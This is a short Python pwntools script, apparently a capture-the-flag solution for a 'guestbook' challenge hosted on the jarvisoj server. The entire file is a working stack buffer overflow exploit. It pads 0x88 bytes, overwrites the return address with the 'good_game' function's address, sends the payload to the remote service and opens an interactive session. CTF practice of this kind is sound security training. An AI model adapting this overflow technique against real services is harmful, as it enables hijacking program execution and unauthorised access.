from pwn import *

sh = remote('pwn.jarvisoj.com', 9876)

elf = ELF('./guestbook')

flag_addr = elf.symbols['good_game']

payload = 'a' * 0x88 + p64(flag_addr)

sh.send(payload)

sh.interactive()
sh.close()